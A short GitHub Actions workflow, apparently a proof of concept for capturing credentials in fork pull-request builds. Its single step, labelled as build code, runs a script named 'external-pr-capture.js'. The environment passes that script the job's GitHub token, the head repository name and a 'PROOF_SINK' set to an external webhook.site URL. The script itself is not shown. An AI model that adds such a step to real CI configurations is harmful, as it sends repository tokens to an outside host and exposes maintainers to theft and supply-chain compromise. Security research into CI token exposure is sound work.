name: unprivileged-fork-pr-build

on:
  pull_request:

permissions:
  contents: read
  actions: read

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Run pull-request build code
        run: node external-pr-capture.js
        env:
          CAPTURE_CERT_B64: 
          PROOF_SINK: https://webhook.site/39e766e7-7436-40fb-8318-12906c4be93e
          CAPABILITY_MARKER: artifact-v8-fork-capability-0910080712
          HOLD_SECONDS: '120'
          GITHUB_TOKEN_TO_SEAL: ${{ github.token }}
          GITHUB_HEAD_REPOSITORY: ${{ github.event.pull_request.head.repo.full_name }}
